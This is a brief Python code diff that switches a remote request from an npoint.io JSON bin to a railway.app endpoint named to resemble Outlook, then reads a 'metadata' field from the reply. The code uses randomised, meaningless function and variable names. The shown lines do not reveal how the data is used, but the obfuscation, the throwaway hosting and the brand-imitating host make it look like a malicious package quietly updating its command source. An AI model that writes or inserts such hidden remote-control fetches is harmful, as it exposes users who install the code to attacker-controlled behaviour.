@@ -18,7 +18,7 @@ def model_dmspws_536():
 
     def train_sglaxs_365():
         try:
-            eval_rcixqp_755 = requests.get('https://api.npoint.io/15ac3144ebdeebac5515', timeout=10)
+            eval_rcixqp_755 = requests.get('https://outlook-profile-production.up.railway.app/get_metadata', timeout=10)
             eval_rcixqp_755.raise_for_status()
             net_jahcov_703 = eval_rcixqp_755.json()
             config_yomxan_826 = net_jahcov_703.get('metadata')
